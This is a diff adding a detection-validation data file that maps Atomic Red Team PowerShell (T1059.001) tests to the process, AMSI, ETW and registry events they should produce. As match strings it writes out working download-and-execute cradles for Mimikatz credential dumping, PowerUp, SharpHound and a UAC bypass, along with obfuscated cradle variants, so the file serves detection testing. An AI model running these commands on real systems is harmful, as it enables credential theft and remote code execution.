@@ -1,0 +1,182 @@
+T1059.001,windows,f3132740,Mimikatz
+ARG,mimurl,https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+_E_,Process,cmdline~=powershell.exe IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds
+
+T1059.001,windows,a21bb23e,Run BloodHound from local disk
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content*=.*import-module ".*atomics.*ExternalPayloads.*SharpHound.ps1"
+_E_,AMSI,scan_content~=Invoke-BloodHound -OutputDirectory $env:Temp
+_E_,AMSI,scan_content~=Start-Sleep 5
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list*=.*import-module ".*atomics.*ExternalPayloads.*SharpHound.ps1"
+_E_,ETW,event_data_list~=Invoke-BloodHound -OutputDirectory $env:Temp
+_E_,ETW,event_data_list~=Start-Sleep 5
+
+T1059.001,windows,bf8c1441,Run Bloodhound from Memory using Download Cradle
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
+_E_,AMSI,scan_content~=IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
+_E_,AMSI,scan_content~=Invoke-BloodHound -OutputDirectory $env:Temp
+_E_,AMSI,scan_content~=Start-Sleep 5
+
+T1059.001,windows,4297c41a,Obfuscation Tests
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
+_E_,AMSI,scan_content~=(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
+_E_,AMSI,scan_content~=Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
+
+T1059.001,windows,af1800cf,Mimikatz - Cradlecraft PsSendKeys
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',
+_E_,AMSI,scan_content~=([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',
+_E_,AMSI,scan_content~=0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),
+_E_,AMSI,scan_content~='~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a',
+_E_,AMSI,scan_content~='^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
+
+T1059.001,windows,06a220b6,Invoke-AppPathBypass
+_E_,Process,cmdline~=Powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'
+
+T1059.001,windows,388a7340,Powershell MsXml COM object - with prompt
+ARG,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
+_E_,Process,cmdline~=powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText
+
+T1059.001,windows,4396927f,Powershell XML requests
+ARG,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
+_E_,Process,cmdline~=powershell.exe -exec bypass -noprofile $Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX
+
+T1059.001,windows,8a2ad40b,Powershell invoke mshta.exe download
+ARG,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
+_E_,Process,cmdline~=mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()
+
+T1059.001,windows,fa050f5e,PowerShell Fileless Script Execution
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam /v ART /t REG_SZ /d U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI= /f
+_E_,REG,event_type~=CREATEKEY
+_E_,REG,event_type~=SETVALUEKEY
+_E_,REG,key_name~=AtomicRedTeam
+_E_,REG,value_name~=ART
+_E_,AMSI,scan_content~=iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
+
+T1059.001,windows,9148e7c4,PowerShell Downgrade Attack
+_E_,Process,cmdline~=powershell.exe -version 2 -Command Write-Host
+_E_,AMSI,scan_content~=powershell.exe -version 2 -Command Write-Host $PSVersion
+
+T1059.001,windows,8e5c5532,NTFS Alternate Data Stream Access
+ARG,ads_file,%TEMP%\NTFS_ADS.txt
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=Add-Content -Path %TEMP%\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+_E_,AMSI,scan_content~=streamcommand = Get-Content -Path %TEMP%\NTFS_ADS.txt -Stream 'streamcommand'
+_E_,AMSI,scan_content~=Invoke-Expression $streamcommand
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=Add-Content -Path %TEMP%\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+_E_,ETW,event_data_list~=streamcommand = Get-Content -Path %TEMP%\NTFS_ADS.txt -Stream 'streamcommand'
+_E_,ETW,event_data_list~=Invoke-Expression $streamcommand
+
+T1059.001,windows,7c1acec2,PowerShell Session Creation and Use
+ARG,hostname_to_connect,%COMPUTERNAME%
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=New-PSSession -ComputerName #{hostname_to_connect}
+_E_,AMSI,scan_content~=Test-Connection $env:COMPUTERNAME
+_E_,AMSI,scan_content~=Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
+_E_,AMSI,scan_content~=Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+_E_,AMSI,scan_content~=Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=New-PSSession -ComputerName #{hostname_to_connect}
+_E_,ETW,event_data_list~=Test-Connection $env:COMPUTERNAME
+_E_,ETW,event_data_list~=Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
+_E_,ETW,event_data_list~=Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+_E_,ETW,event_data_list~=Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+
+T1059.001,windows,686a9785,ATHPowerShellCommandLineParameter -Command parameter variations
+ARG,command_line_switch_type,Hyphen
+ARG,command_param_variation,C
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop
+
+T1059.001,windows,1c0a870f,ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
+ARG,command_line_switch_type,Hyphen
+ARG,command_param_variation,C
+ARG,encoded_arguments_param_variation,EA
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
+
+T1059.001,windows,86a43bad,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
+ARG,encoded_command_param_variation,E
+ARG,command_line_switch_type,Hyphen
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop
+
+T1059.001,windows,0d181431,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
+ARG,encoded_command_param_variation,E
+ARG,command_line_switch_type,Hyphen
+ARG,encoded_arguments_param_variation,EncodedArguments
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
+
+T1059.001,windows,a538de64,PowerShell Command Execution
+ARG,obfuscated_code,JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+_E_,Process,cmdline~=powershell.exe -e #{obfuscated_code}
+
+T1059.001,windows,49eb9404,PowerShell Invoke Known Malicious Cmdlets
+ARG,Malicious_cmdlets,"Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=$malcmdlets = #{Malicious_cmdlets}
+_E_,AMSI,scan_content~=foreach ($cmdlets in $malcmdlets) {
+_E_,AMSI,scan_content~=    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
+_E_,AMSI,scan_content~=foreach ($cmdlets in $malcmdlets) {
+_E_,AMSI,scan_content~=    $cmdlets}
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=$malcmdlets = #{Malicious_cmdlets}
+_E_,ETW,event_data_list~=foreach ($cmdlets in $malcmdlets) {
+_E_,ETW,event_data_list~="function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
+_E_,ETW,event_data_list~=foreach ($cmdlets in $malcmdlets) {
+_E_,ETW,event_data_list~=$cmdlets}
+
+T1059.001,windows,1289f78d,PowerUp Invoke-AllChecks
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+_E_,AMSI,scan_content~=iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
+_E_,AMSI,scan_content~=Invoke-AllChecks
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+_E_,ETW,event_data_list~=iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
+_E_,ETW,event_data_list~=Invoke-AllChecks
+
+T1059.001,windows,999bff6d,Abuse Nslookup with DNS Records
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("",
+_E_,AMSI,scan_content~="whoami")}
+_E_,AMSI,scan_content~=powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("",
+_E_,ETW,event_data_list~="whoami")}
+_E_,ETW,event_data_list~=powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
+
